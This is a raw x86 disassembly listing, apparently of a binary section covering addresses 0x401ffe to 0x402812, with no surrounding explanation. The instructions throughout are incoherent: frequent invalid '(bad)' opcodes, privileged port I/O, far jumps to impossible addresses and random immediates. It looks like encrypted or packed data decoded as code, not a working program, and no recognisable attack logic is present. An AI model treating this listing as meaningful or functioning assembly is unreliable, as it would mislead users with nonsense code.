  401ffe:	mov    ch,0x15
  402000:	mov    bl,0x2f
  402002:	scas   al,BYTE PTR es:[edi]
  402003:	imul   ebx,DWORD PTR [ebx-0x69],0xd3cccb44
  40200a:	ins    DWORD PTR es:[edi],dx
  40200b:	mov    bh,0x9b
  40200d:	loopne 0x402030
  40200f:	xchg   ebx,eax
  402010:	test   eax,0xfe78374f
  402015:	jecxz  0x402033
  402017:	mov    edi,0xb2b173d1
  40201c:	pop    eax
  40201d:	les    ebp,FWORD PTR [ebx+ebx*4+0x176322b0]
  402024:	fbstp  TBYTE PTR [ebp+0x33]
  402027:	and    ecx,DWORD PTR [ebp+0x175f7fbf]
  40202d:	mov    al,ds:0xe1335a2e
  402032:	(bad)  
  402033:	jbe    0x401fd7
  402035:	aad    0xf7
  402037:	xlat   BYTE PTR ds:[ebx]
  402038:	cld    
  402039:	retf   
  40203a:	lock push ebp
  40203c:	sub    esp,ecx
  40203e:	(bad)  
  40203f:	test   BYTE PTR [esi-0x265db606],0x27
  402046:	scas   eax,DWORD PTR es:[edi]
  402047:	in     eax,0x53
  402049:	(bad)  
  40204a:	fmul   DWORD PTR [edi]
  40204c:	pop    ebp
  40204d:	or     al,0x88
  40204f:	xor    al,0xd7
  402051:	or     BYTE PTR [ebx+eax*1],al
  402054:	jne    0x40200f
  402056:	add    eax,0xbfd3615d
  40205b:	xchg   esp,eax
  40205c:	icebp  
  40205d:	dec    edi
  40205e:	xchg   ebp,eax
  40205f:	fwait
  402060:	rcr    DWORD PTR [esp+edx*1],1
  402063:	pop    edi
  402064:	or     DWORD PTR [esi+ebx*1],eax
  402067:	jle    0x402067
  402069:	(bad)  
  40206b:	out    dx,eax
  40206c:	repnz lock push ss
  40206f:	fwait
  402070:	es dec eax
  402072:	push   ebx
  402073:	js     0x402096
  402075:	pop    ebp
  402076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402077:	add    al,0xd2
  402079:	or     eax,0x7457ee3d
  40207e:	mov    WORD PTR [ecx-0x934aeea],gs
  402084:	xchg   edi,eax
  402085:	adc    eax,0xee64eed7
  40208a:	mov    bh,0xc0
  40208c:	or     al,0x77
  40208e:	lahf   
  40208f:	test   DWORD PTR [edi+ebx*1-0x4c2d863b],0x2aed5f4a
  40209a:	jmp    0x2733fe8a
  40209f:	aas    
  4020a0:	ret    0xfd95
  4020a3:	data16 fild QWORD PTR [edi+0x62]
  4020a8:	pop    esi
  4020a9:	neg    BYTE PTR [edi+esi*4]
  4020ac:	push   ss
  4020ad:	test   BYTE PTR [eax+ecx*1+0x25d54da3],cl
  4020b4:	cmp    al,0x40
  4020b6:	clc    
  4020b7:	pop    ss
  4020b8:	pop    ebp
  4020b9:	call   0xa421:0xa5f68d4
  4020c0:	(bad)  
  4020c2:	and    ecx,esp
  4020c4:	pop    eax
  4020c5:	jo     0x402062
  4020c7:	xchg   edx,ebp
  4020c9:	in     eax,0x54
  4020cb:	std    
  4020cc:	int    0xca
  4020ce:	sahf   
  4020cf:	pop    ss
  4020d0:	mov    bh,0x74
  4020d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020d3:	lods   eax,DWORD PTR ds:[esi]
  4020d4:	dec    eax
  4020d5:	scas   al,BYTE PTR es:[edi]
  4020d6:	push   edi
  4020d7:	mov    esp,0x63c4dc37
  4020dc:	sbb    DWORD PTR [ecx-0x57],edx
  4020df:	cwde   
  4020e0:	in     al,dx
  4020e1:	sbb    edx,ecx
  4020e3:	(bad)  
  4020e4:	lock test eax,0x23e780e2
  4020ea:	mov    ds:0xe9386131,al
  4020ef:	xor    al,0xa7
  4020f1:	xchg   ecx,eax
  4020f2:	add    al,0x8d
  4020f4:	jae    0x40209b
  4020f6:	xor    al,0x0
  4020f8:	or     dh,bh
  4020fa:	jb     0x402122
  4020fc:	ins    BYTE PTR es:[edi],dx
  4020fd:	xor    eax,0x95f02cb
  402102:	arpl   WORD PTR [ecx+edi*2],bp
  402105:	test   eax,0x109c8c1
  40210a:	lock jnp 0x4020ea
  40210d:	clc    
  40210e:	jbe    0x402099
  402110:	jp     0x402106
  402112:	push   edi
  402113:	and    BYTE PTR [ecx-0x5d2e82eb],0xad
  40211a:	xchg   eax,eax
  40211c:	push   esp
  40211d:	jmp    0x402194
  40211f:	inc    edi
  402120:	adc    BYTE PTR [edi-0x7e04e3da],0xf7
  402127:	jge    0x402172
  402129:	push   ss
  40212a:	xchg   ebx,eax
  40212b:	popf   
  40212c:	data16 mov cl,0xe0
  40212f:	scas   al,BYTE PTR es:[edi]
  402130:	pop    ebx
  402131:	mov    esp,0xc60011b0
  402136:	aas    
  402137:	shl    DWORD PTR [ecx-0x657a0646],0x4c
  40213e:	fwait
  40213f:	clc    
  402140:	mov    DWORD PTR [edi+0x44545121],esp
  402146:	jmp    0xb2f4:0xe80bfc07
  40214d:	xor    DWORD PTR [eax-0x293d38d5],0xa9317e5b
  402157:	shl    DWORD PTR [ebx-0x676b562f],0xb
  40215e:	or     BYTE PTR [eax-0x63],0x47
  402162:	push   0x6e
  402164:	(bad)  [ebx]
  402166:	cmp    ah,BYTE PTR [ecx]
  402168:	inc    ebp
  402169:	jne    0x402161
  40216b:	fisub  DWORD PTR [ecx]
  40216d:	std    
  40216e:	(bad)
  402172:	in     al,dx
  402173:	cwde   
  402174:	mov    eax,0x50ecbef6
  402179:	xor    ecx,DWORD PTR [ecx+0x46]
  40217c:	dec    ebx
  40217d:	ds ss and ebp,ebx
  402181:	aaa    
  402182:	sbb    ah,BYTE PTR [edi+0xfa91a17]
  402188:	leave  
  402189:	add    al,0x70
  40218b:	bound  esi,QWORD PTR [edi-0x50]
  40218e:	fst    DWORD PTR [ecx]
  402190:	jl     0x40214a
  402192:	lods   eax,DWORD PTR ds:[esi]
  402193:	xor    DWORD PTR [ebp-0x27],esi
  402196:	les    edx,FWORD PTR ds:0x1060c369
  40219c:	mov    edi,0x252247c2
  4021a1:	sbb    BYTE PTR fs:0x8d5447d1,ah
  4021a8:	push   edi
  4021a9:	cmp    cl,BYTE PTR [edi]
  4021ab:	das    
  4021ac:	add    eax,0x2231a1c8
  4021b1:	add    eax,0xf76e1cb3
  4021b6:	scas   eax,DWORD PTR es:[edi]
  4021b7:	addr16 push ecx
  4021b9:	and    BYTE PTR [ebp-0x30],0x2d
  4021bd:	pop    esp
  4021be:	cld    
  4021bf:	rol    BYTE PTR [edi+0x24],1
  4021c2:	fdivr  DWORD PTR [edx-0xbbc9393]
  4021c8:	lahf   
  4021c9:	adc    DWORD PTR [edx+ecx*8+0x22a400dd],esi
  4021d0:	std    
  4021d1:	outs   dx,DWORD PTR ds:[esi]
  4021d2:	leave  
  4021d3:	jno    0x4021f3
  4021d5:	lods   eax,DWORD PTR ds:[esi]
  4021d6:	mov    al,ds:0xd7e9fb81
  4021db:	repz add DWORD PTR [edx-0x6790e792],esi
  4021e2:	xchg   BYTE PTR [ecx-0xf],al
  4021e5:	pop    esi
  4021e6:	mov    ecx,0xd4f41318
  4021eb:	xor    BYTE PTR [edx+ebx*4],al
  4021ee:	mov    cl,0x39
  4021f0:	das    
  4021f1:	pop    esp
  4021f2:	jns    0x4021f3
  4021f4:	dec    edi
  4021f5:	mov    al,ds:0x7256f37d
  4021fa:	scas   eax,DWORD PTR es:[edi]
  4021fb:	test   BYTE PTR [ecx+0x3c],dh
  4021fe:	aam    0x43
  402200:	dec    edi
  402201:	push   ecx
  402202:	loope  0x40223e
  402204:	xor    BYTE PTR gs:0x7d95bf86,ch
  40220b:	mov    ebp,0xae108803
  402210:	mov    ebx,0x8bad277f
  402215:	push   ebx
  402216:	test   al,0x5d
  402218:	xchg   esi,eax
  402219:	pop    esp
  40221a:	pop    esi
  40221b:	mov    ecx,0xb8faccc8
  402220:	pop    edx
  402221:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402223:	jmp    0xd0d5c8a0
  402228:	fisubr DWORD PTR ds:[eax+0xd]
  40222c:	lea    ebx,[edi+ebp*2]
  40222f:	stos   DWORD PTR es:[edi],eax
  402230:	push   ebp
  402231:	in     eax,dx
  402232:	mov    WORD PTR [eax],gs
  402234:	(bad)  
  402235:	xchg   esp,eax
  402236:	adc    al,0xd2
  402238:	fnstenv [eax]
  40223a:	scas   eax,DWORD PTR es:[edi]
  40223b:	mov    WORD PTR [edx],ss
  40223d:	out    0x7e,al
  40223f:	ins    DWORD PTR es:[edi],dx
  402240:	pop    esi
  402241:	pop    es
  402242:	lock sti 
  402244:	shl    bl,1
  402246:	cmp    BYTE PTR [ecx+edi*1-0x56],dh
  40224a:	cdq    
  40224b:	jne    0x40229e
  40224d:	mov    ch,0xf
  40224f:	enter  0xea88,0xd1
  402253:	cmp    eax,0x59db69f6
  402258:	es push esi
  40225a:	es xor al,0x52
  40225d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40225e:	mov    al,ds:0xc3f50bbc
  402263:	pop    ds
  402264:	int    0x8a
  402266:	mov    bh,0xf9
  402268:	jne    0x40226f
  40226a:	inc    ebp
  40226b:	test   BYTE PTR [eax+0x7f],0x20
  40226f:	outs   dx,BYTE PTR ds:[esi]
  402270:	cmp    BYTE PTR cs:[esp+edi*2],cl
  402274:	popa   
  402275:	js     0x402260
  402277:	fwait
  402278:	jmp    0x9ac505d1
  40227d:	push   esi
  40227e:	push   ecx
  40227f:	dec    edx
  402280:	mov    ah,0x72
  402282:	out    0x57,al
  402284:	jns    0x40229f
  402286:	jb     0x4022b5
  402288:	push   es
  402289:	mul    BYTE PTR [bx]
  40228c:	add    eax,0x2a047587
  402291:	ficom  WORD PTR [ecx-0x7d]
  402294:	and    BYTE PTR [edi-0x80],0x1d
  402298:	mov    esp,0x22eb6b89
  40229d:	jb     0x402238
  40229f:	and    eax,0x34ddbaad
  4022a4:	stos   DWORD PTR es:[edi],eax
  4022a5:	loope  0x40231f
  4022a7:	lock imul ebp,edx,0x8f9074d7
  4022ae:	push   0x20
  4022b0:	xlat   BYTE PTR ds:[ebx]
  4022b1:	sub    esi,DWORD PTR ds:0x4e4be040
  4022b7:	mov    ds:0x891893d0,eax
  4022bc:	aad    0x3c
  4022be:	call   0xb66c:0x1433a355
  4022c5:	fist   DWORD PTR [esi]
  4022c7:	ret    
  4022c8:	leave  
  4022c9:	jmp    0x9a1f2a6f
  4022ce:	out    0x2e,al
  4022d0:	add    BYTE PTR [ecx+0x52d4856c],dh
  4022d6:	dec    eax
  4022d7:	lds    ebx,FWORD PTR [edi]
  4022d9:	mov    edx,0x4a84133d
  4022de:	inc    edi
  4022df:	jbe    0x402305
  4022e1:	inc    edi
  4022e2:	mov    bh,0x82
  4022e4:	or     eax,0xff5be06f
  4022e9:	repz sbb edx,ebx
  4022ec:	daa    
  4022ed:	pop    esp
  4022ee:	pop    eax
  4022ef:	dec    edi
  4022f0:	pop    ebx
  4022f1:	xor    ch,BYTE PTR [edx-0x16c0d6bd]
  4022f7:	sub    BYTE PTR [esi],cl
  4022f9:	push   ss
  4022fa:	jb     0x402352
  4022fc:	adc    al,cl
  4022fe:	sbb    al,0x19
  402300:	xor    ch,ah
  402302:	aad    0xf4
  402304:	mov    bl,0xb5
  402306:	mov    al,ds:0xa1fa17e7
  40230b:	nop
  40230c:	add    esp,edx
  40230e:	or     BYTE PTR ds:[edx-0x3596643f],bl
  402315:	push   esp
  402316:	mov    edi,0x9a1f03c8
  40231b:	mov    eax,esp
  40231d:	dec    esi
  40231e:	and    DWORD PTR [ebx+0xa],ebx
  402321:	cmovns ebp,DWORD PTR [ebp+0xc7400eb]
  402328:	idiv   BYTE PTR [edi+edx*8+0x15]
  40232c:	test   al,0x47
  40232e:	mov    edi,0xfefb12c0
  402333:	(bad)  
  402334:	cld    
  402335:	shl    BYTE PTR [ebx-0x2a],0x64
  402339:	sub    esi,DWORD PTR [ebx+0xf00aea2]
  40233f:	out    dx,eax
  402340:	inc    ecx
  402341:	sub    al,0xbd
  402343:	jle    0x40235f
  402345:	imul   esi,DWORD PTR [ebp*1+0x60dd0277],0xfffffff9
  40234d:	inc    esi
  40234e:	aas    
  40234f:	mov    ch,dh
  402351:	dec    ebx
  402352:	xor    al,0x95
  402354:	lea    eax,[ebp+0x19153c80]
  40235a:	jp     0x402389
  40235c:	mov    eax,ds:0x9a0ebd30
  402361:	pop    ds
  402362:	jg     0x402308
  402364:	or     eax,0x41add3e4
  402369:	dec    eax
  40236a:	xor    al,ch
  40236c:	push   0x72864dfb
  402371:	out    dx,al
  402372:	xor    al,0xe1
  402374:	sbb    DWORD PTR [ecx+esi*8-0x5d],0xffffffaf
  402379:	pop    edi
  40237a:	std    
  40237b:	ins    DWORD PTR es:[edi],dx
  40237c:	mov    DWORD PTR [edi+0x36db29d8],ecx
  402382:	xchg   edx,eax
  402383:	scas   al,BYTE PTR es:[edi]
  402384:	and    eax,esi
  402386:	outs   dx,DWORD PTR ds:[esi]
  402387:	js     0x402343
  402389:	inc    esi
  40238a:	ins    DWORD PTR es:[edi],dx
  40238b:	mov    al,0xd1
  40238d:	sbb    bh,ch
  40238f:	rol    DWORD PTR [edx],0x29
  402392:	xor    edx,ebx
  402394:	add    dh,ch
  402396:	jp     0x4023ae
  402398:	mov    cl,0x50
  40239a:	lock aas 
  40239c:	sbb    BYTE PTR [edi-0x1c4b9684],dl
  4023a2:	add    BYTE PTR ds:0x4c6bf68,dh
  4023a8:	cdq    
  4023a9:	loopne 0x4023c5
  4023ab:	lods   eax,DWORD PTR ds:[esi]
  4023ac:	push   edx
  4023ad:	or     DWORD PTR [esi-0x67257e7e],0xffffff80
  4023b4:	scas   eax,DWORD PTR es:[edi]
  4023b5:	lods   al,BYTE PTR ds:[esi]
  4023b6:	jmp    0x5e627f9e
  4023bb:	mov    edx,0x34c26404
  4023c0:	or     edi,DWORD PTR [esi]
  4023c2:	push   edx
  4023c3:	and    BYTE PTR [eax+ecx*1-0x14],bl
  4023c7:	jo     0x40240e
  4023c9:	je     0x4023d0
  4023cb:	add    al,0x5f
  4023cd:	mov    esp,ecx
  4023cf:	mov    dl,0x36
  4023d1:	adc    edi,DWORD PTR [ecx]
  4023d3:	or     eax,0xf1bca0dc
  4023d8:	shl    BYTE PTR [ebx+0x26c30597],1
  4023de:	adc    eax,0x5f34af7a
  4023e3:	in     al,dx
  4023e4:	push   edx
  4023e5:	adc    esi,DWORD PTR [ebx+0x4c138062]
  4023eb:	jno    0x402459
  4023ed:	and    DWORD PTR [ebx-0x2],edx
  4023f0:	mov    edi,0x71ca3894
  4023f5:	jo     0x4023b8
  4023f7:	rcl    DWORD PTR [edx+ecx*8+0x7],cl
  4023fb:	inc    eax
  4023fc:	and    eax,0x940de81a
  402401:	mov    esi,0xf6ee2385
  402406:	or     dl,BYTE PTR [edx]
  402408:	scas   eax,DWORD PTR es:[edi]
  402409:	sub    DWORD PTR [ebp-0x4917c0cf],esi
  40240f:	test   eax,0xd4b5357a
  402414:	jmp    0x40242f
  402416:	jno    0x402493
  402418:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40241a:	add    DWORD PTR [eax*1+0x476dbb2f],ebx
  402421:	lods   eax,DWORD PTR ds:[esi]
  402422:	push   ecx
  402423:	and    DWORD PTR [ecx-0x61d1f355],0x849cc2af
  40242d:	aas    
  40242e:	pop    ebx
  40242f:	xchg   esi,eax
  402430:	retf   
  402431:	scas   eax,DWORD PTR es:[edi]
  402432:	inc    eax
  402433:	xchg   BYTE PTR ds:[edi-0x78106726],ah
  40243a:	ret    0xcd18
  40243d:	jb     0x40247c
  40243f:	pop    ds
  402440:	cmp    DWORD PTR [ebp+0x56],edi
  402443:	ror    DWORD PTR [ebp+0x67ffc9f5],1
  402449:	inc    eax
  40244a:	ins    DWORD PTR es:[edi],dx
  40244b:	add    eax,0x5ddc4377
  402450:	sar    BYTE PTR [ecx],0x13
  402453:	mov    al,ds:0x3c5fdda2
  402458:	mov    cs,ebp
  40245a:	cmp    BYTE PTR ds:[ebx-0x4d25d551],0xde
  402462:	int    0x6d
  402464:	es push 0x1d
  402467:	ror    DWORD PTR [ecx],0x74
  40246a:	or     al,0x1f
  40246c:	jmp    0x4492:0x16653e19
  402473:	out    0x79,eax
  402475:	sub    DWORD PTR [ecx],0xffffffe9
  402478:	call   eax
  40247a:	mov    ebx,0x7f66b9d6
  40247f:	jbe    0x402424
  402481:	xchg   esi,eax
  402482:	and    edi,DWORD PTR [edi-0x41]
  402485:	ds mov esp,0x9b89fa55
  40248b:	sbb    esi,eax
  40248d:	mov    cl,0xc0
  40248f:	ret    
  402490:	cs xchg ecx,eax
  402492:	retf   
  402493:	clc    
  402494:	and    al,0x7d
  402496:	fisub  DWORD PTR [esi]
  402498:	xchg   ebp,eax
  402499:	sub    ah,bh
  40249b:	je     0x4024e8
  40249d:	test   BYTE PTR ds:0x4e3d4d24,0x6c
  4024a4:	add    bh,ch
  4024a6:	cmp    dl,BYTE PTR [ecx]
  4024a8:	int    0x6c
  4024aa:	mov    esi,0xec5b626d
  4024af:	(bad)  
  4024b0:	add    esp,0xe3e29238
  4024b6:	push   0xff57e839
  4024bb:	adc    al,0x6b
  4024bd:	sbb    al,0x57
  4024bf:	pop    ecx
  4024c0:	cmp    DWORD PTR [esi+eiz*4-0x231d4ba0],ebx
  4024c7:	jp     0x40245f
  4024c9:	jl     0x40253d
  4024cb:	mov    BYTE PTR [ebx+0x5ccd9958],dh
  4024d1:	ss push ecx
  4024d3:	arpl   bp,si
  4024d5:	jg     0x40251b
  4024d7:	stc    
  4024d8:	jo     0x4024f8
  4024da:	dec    edi
  4024db:	(bad)
  4024df:	sub    al,0xa0
  4024e1:	fldcw  WORD PTR [edx-0x17]
  4024e4:	inc    esi
  4024e5:	xlat   BYTE PTR ds:[ebx]
  4024e6:	xor    eax,0xe6d73a82
  4024eb:	xchg   ebx,eax
  4024ec:	adc    ebp,DWORD PTR [eax]
  4024ee:	aas    
  4024ef:	cmp    edx,esi
  4024f1:	xchg   esi,eax
  4024f2:	or     DWORD PTR [edi+0x5c8a0ec1],eax
  4024f8:	xor    ebp,DWORD PTR [ebp-0x43]
  4024fb:	cmp    dl,dh
  4024fd:	aas    
  4024fe:	xchg   ebx,eax
  4024ff:	sahf   
  402500:	pop    ecx
  402501:	jp     0x402543
  402503:	and    esp,DWORD PTR [edi-0x7e4337ec]
  402509:	leave  
  40250a:	(bad)  
  40250b:	mov    ebp,0x513bf59f
  402510:	(bad)  
  402511:	pop    ebp
  402512:	add    esi,DWORD PTR [edi+esi*4+0x5c16502f]
  402519:	sbb    eax,0xc133afd
  40251e:	mov    dl,0xe7
  402520:	pop    ebp
  402521:	pop    ebx
  402522:	(bad)  
  402526:	xor    BYTE PTR [edx+0x3b],dl
  402529:	add    eax,0x22695d1
  40252e:	or     bl,bl
  402530:	in     eax,0x41
  402532:	retf   0xafea
  402535:	mov    ch,0x53
  402537:	lea    edi,[esi+0xe49f0fe]
  40253d:	mov    ebp,0x1bb49c20
  402542:	jge    0x4025c1
  402544:	pop    ds
  402545:	int    0xaf
  402547:	mov    edi,0x5bdde8c9
  40254c:	sub    bl,ch
  40254e:	mov    esi,0xd375ab7
  402553:	loope  0x4025b1
  402555:	mov    eax,DWORD PTR [ecx]
  402557:	and    al,0xa7
  402559:	in     eax,0x6
  40255b:	jmp    0x3d12:0xb2803442
  402562:	dec    ebx
  402563:	cmp    esp,esi
  402565:	mov    ebx,0xff29e4e5
  40256a:	cld    
  40256b:	xor    eax,0xa93a8eab
  402570:	add    DWORD PTR [edx-0x23aab52e],0xffffffc1
  402577:	out    dx,eax
  402578:	pop    ecx
  402579:	push   ss
  40257a:	(bad)  
  40257c:	push   ds
  40257d:	into   
  40257e:	xor    bh,dh
  402580:	xchg   BYTE PTR [ebx+0x19],bl
  402583:	add    BYTE PTR [edx-0x52438396],cl
  402589:	(bad)  
  40258a:	xchg   ebp,eax
  40258b:	xchg   ecx,esp
  40258d:	out    dx,eax
  40258e:	inc    esp
  40258f:	sub    al,BYTE PTR [ebx+0xc]
  402592:	jae    0x402597
  402594:	pop    eax
  402595:	or     BYTE PTR [ebp-0x2eab190d],bl
  40259b:	xor    al,0xfa
  40259d:	aam    0x4a
  40259f:	inc    ecx
  4025a0:	pop    es
  4025a1:	mov    bh,0x8d
  4025a3:	test   DWORD PTR [esi+0x76ff6c34],0x988c5b0
  4025ad:	in     al,0xf7
  4025af:	xchg   edx,eax
  4025b0:	retf   
  4025b1:	mov    dl,BYTE PTR [edi+0x18]
  4025b4:	fisubr WORD PTR [eax+0x22]
  4025b7:	push   ds
  4025b8:	(bad)  [ecx]
  4025ba:	test   DWORD PTR [eax+0x41d22fe2],0x4f986928
  4025c4:	xor    esi,ecx
  4025c6:	popf   
  4025c7:	outs   dx,DWORD PTR ds:[esi]
  4025c8:	stc    
  4025c9:	adc    BYTE PTR [eax+esi*4],0x23
  4025cd:	ficom  WORD PTR [eax]
  4025cf:	add    esi,DWORD PTR [esi+0x1]
  4025d2:	jb     0x40255c
  4025d4:	mov    edx,0x50fdeb6a
  4025d9:	mov    bl,BYTE PTR [ebp-0x3e]
  4025dc:	adc    esi,DWORD PTR [edx-0x56f9e29]
  4025e2:	in     al,dx
  4025e3:	cmp    cl,ch
  4025e5:	imul   DWORD PTR [edx-0x50]
  4025e8:	mov    dh,0x6
  4025ea:	mov    ah,0x8b
  4025ec:	cli    
  4025ed:	into   
  4025ee:	shr    BYTE PTR [esi-0xd2a6a0a],1
  4025f4:	sub    al,0xb9
  4025f6:	fisub  WORD PTR [eax+eax*8+0x72919ab0]
  4025fd:	in     al,dx
  4025fe:	mov    ebx,eax
  402600:	dec    ecx
  402601:	mov    es,edx
  402603:	repnz sub BYTE PTR [eax],ah
  402606:	mov    ah,bl
  402608:	stos   DWORD PTR es:[edi],eax
  402609:	or     esp,DWORD PTR [esi]
  40260b:	out    0x44,eax
  40260d:	test   al,0x9f
  40260f:	sub    edi,DWORD PTR [ecx-0x66]
  402612:	xlat   BYTE PTR ds:[ebx]
  402613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402614:	aam    0xe8
  402616:	call   0x9e2cb85d
  40261b:	sbb    bl,BYTE PTR [eax]
  40261d:	imul   BYTE PTR [eax+0xa]
  402620:	push   edi
  402621:	jmp    0x402664
  402623:	mov    al,ds:0x38f60bb
  402628:	jns    0x40265d
  40262a:	sahf   
  40262b:	mov    edx,0x7be760c8
  402630:	scas   al,BYTE PTR es:[edi]
  402631:	cdq    
  402632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402633:	jo     0x4025f5
  402635:	adc    eax,DWORD PTR [edx-0x47]
  402638:	jns    0x40260c
  40263a:	fs xchg edi,eax
  40263c:	xchg   ecx,eax
  40263d:	fcomp  DWORD PTR [edi-0x712bfa7f]
  402643:	push   ss
  402644:	push   esi
  402645:	pop    ebx
  402646:	popf   
  402647:	pop    esi
  402648:	push   ds
  402649:	xor    DWORD PTR [edi+eiz*1+0x5b],ebx
  40264d:	sbb    eax,DWORD PTR [edi-0x5]
  402650:	aam    0xa4
  402652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402653:	dec    edx
  402654:	fcomip st,st(4)
  402656:	or     bh,BYTE PTR [esi]
  402658:	add    BYTE PTR [eax-0x4ba208fa],dl
  40265e:	repnz rol DWORD PTR [ebp-0x6d],cl
  402662:	ret    0xf650
  402665:	outs   dx,DWORD PTR ds:[esi]
  402666:	jl     0x40269e
  402668:	ja     0x402633
  40266a:	add    ah,BYTE PTR [eax+edi*8+0x62276714]
  402671:	lods   eax,DWORD PTR ds:[esi]
  402672:	xor    al,0xc0
  402674:	inc    eax
  402675:	mov    ebx,0x746ecb7d
  40267a:	cwde   
  40267b:	dec    eax
  40267c:	rcl    BYTE PTR [ebx+0x69],cl
  40267f:	pop    esp
  402680:	scas   al,BYTE PTR es:[edi]
  402681:	test   BYTE PTR [edx],0xb9
  402684:	push   ds
  402685:	push   DWORD PTR es:[edi+edx*1+0x5f72302f]
  40268d:	xchg   edi,eax
  40268e:	adc    al,0xda
  402690:	xchg   ebp,eax
  402691:	loopne 0x40269d
  402693:	jmp    0x40261d
  402695:	xchg   ecx,eax
  402696:	out    0xef,al
  402698:	pop    es
  402699:	(bad)  
  40269a:	nop
  40269b:	or     al,0xa9
  40269d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40269e:	imul   esi,ebp,0xffffffab
  4026a1:	pop    ss
  4026a2:	aam    0x6a
  4026a4:	sar    BYTE PTR [eax+eax*2],1
  4026a7:	pushf  
  4026a8:	daa    
  4026a9:	cwde   
  4026aa:	aam    0x35
  4026ac:	inc    ecx
  4026ad:	aad    0xc9
  4026af:	cmc    
  4026b0:	mov    dh,0x42
  4026b2:	cmp    eax,0x3e89bec
  4026b7:	sub    DWORD PTR [esi+0x6b],0x4228943d
  4026be:	jle    0x4026b0
  4026c0:	sbb    DWORD PTR [ebx-0x64f4ac3e],esp
  4026c6:	sub    dl,cl
  4026c8:	xchg   ecx,eax
  4026c9:	dec    esp
  4026ca:	fld    QWORD PTR [esi-0x3b6b3a8]
  4026d0:	std    
  4026d1:	int3   
  4026d2:	xchg   ah,al
  4026d4:	cmp    edx,DWORD PTR [eax+0x717b46f4]
  4026da:	iret   
  4026db:	pop    esi
  4026dc:	push   edx
  4026dd:	fistp  WORD PTR [esi-0x4bb75866]
  4026e3:	adc    bh,BYTE PTR [ecx]
  4026e5:	lods   eax,DWORD PTR ds:[esi]
  4026e6:	rol    ebx,1
  4026e8:	push   ds
  4026e9:	sub    DWORD PTR [ecx-0x78028323],eax
  4026ef:	das    
  4026f0:	mov    eax,ds:0x4d5c45f4
  4026f5:	push   esi
  4026f6:	mov    ecx,0x7d5d828e
  4026fb:	inc    ebp
  4026fc:	push   ebp
  4026fd:	push   ebp
  4026fe:	in     al,dx
  4026ff:	stos   DWORD PTR es:[edi],eax
  402700:	or     ch,bh
  402702:	mov    edx,DWORD PTR [esi]
  402704:	imul   ebx,edx,0x36
  402707:	sub    esp,0x303825d4
  40270d:	pop    ebx
  40270e:	das    
  40270f:	ror    DWORD PTR [edi-0xb1cd490],cl
  402715:	xchg   esp,eax
  402716:	mov    bh,0xb2
  402718:	(bad)  
  402719:	in     eax,0x34
  40271b:	mov    eax,ds:0xb22670f2
  402720:	loop   0x402706
  402722:	xor    ah,BYTE PTR [edi+0x1f]
  402725:	cmp    esp,DWORD PTR [ebx-0xe7a5736]
  40272b:	inc    ebp
  40272c:	leave  
  40272d:	jge    0x402712
  40272f:	jp     0x4026de
  402731:	adc    al,0x99
  402733:	or     eax,0xa7b87c32
  402738:	into   
  402739:	(bad)  
  40273b:	xor    bl,dl
  40273d:	out    0xfd,al
  40273f:	mov    bl,0x77
  402741:	ja     0x4027a0
  402743:	sbb    bh,dl
  402745:	lods   al,BYTE PTR ds:[esi]
  402746:	xor    al,dl
  402748:	inc    edi
  402749:	stos   DWORD PTR es:[edi],eax
  40274a:	dec    eax
  40274b:	aam    0x3e
  40274d:	jo     0x402710
  40274f:	bound  edx,QWORD PTR [edi+esi*2+0x4a241880]
  402756:	test   al,bh
  402758:	fs push ecx
  40275a:	jae    0x402759
  40275c:	call   0xbb02bd8
  402761:	out    dx,al
  402762:	fnsavew [edx-0x7592447f]
  402769:	gs mov eax,0xe9329b79
  40276f:	cmp    DWORD PTR [eax],edx
  402771:	lods   al,BYTE PTR ds:[esi]
  402772:	jmp    0x4026f7
  402774:	mov    bl,0x5e
  402776:	jp     0x402732
  402778:	ss in  al,dx
  40277a:	mov    dl,0x74
  40277c:	aaa    
  40277d:	jl     0x4027dd
  40277f:	xchg   edx,eax
  402780:	cwde   
  402781:	sbb    dl,ch
  402783:	adc    BYTE PTR [ebx],bh
  402785:	loopne 0x4027a6
  402787:	cmc    
  402788:	(bad)  
  402789:	rcl    DWORD PTR [esp+eax*2+0xb],0x40
  40278e:	cmp    BYTE PTR [ebp-0x6bc2eeda],bh
  402794:	ret    
  402795:	xchg   edi,eax
  402796:	jge    0x402735
  402798:	out    dx,al
  402799:	or     DWORD PTR [ecx+edx*8-0x67],ebp
  40279d:	cs sti 
  40279f:	mov    cl,0xf7
  4027a1:	jl     0x4027fe
  4027a3:	or     bh,BYTE PTR [edx-0x62]
  4027a6:	dec    esp
  4027a7:	jne    0x4027bc
  4027a9:	xchg   edx,eax
  4027aa:	sub    dh,0xf8
  4027ad:	sub    eax,0xffaf4ac
  4027b2:	pop    ebp
  4027b3:	mov    ds:0x6641cabb,al
  4027b8:	scas   eax,DWORD PTR es:[edi]
  4027b9:	(bad)  
  4027ba:	aaa    
  4027bb:	add    eax,0x513bac4f
  4027c0:	xor    ecx,DWORD PTR [esi-0x1dfa5457]
  4027c6:	pop    ebp
  4027c7:	xor    eax,0x12cc5dea
  4027cc:	or     eax,0x60425d3a
  4027d1:	aas    
  4027d2:	push   0x49434bd3
  4027d7:	jge    0x40281c
  4027d9:	push   ds
  4027da:	out    dx,al
  4027db:	mov    al,ds:0x684fb46f
  4027e0:	(bad)  [esi-0x37]
  4027e3:	sub    dl,BYTE PTR [edi+ebp*1-0x6872cb28]
  4027ea:	and    ch,dl
  4027ec:	ds sbb ah,cl
  4027ef:	jg     0x4027ce
  4027f1:	and    dl,BYTE PTR [ebx+0x41]
  4027f4:	adc    al,0xb9
  4027f6:	mov    ah,BYTE PTR [esp+eiz*8]
  4027f9:	push   es
  4027fa:	mov    ebx,0xdaccc153
  4027ff:	js     0x4027a1
  402801:	mov    WORD PTR [edi+eiz*2],ss
  402804:	sub    eax,0xb192bce6
  402809:	ins    BYTE PTR es:[edi],dx
  40280a:	ss sub edx,ebx
  40280d:	int    0x89
  40280f:	stc    
  402810:	data16 daa 
  402812:	dec    ebp
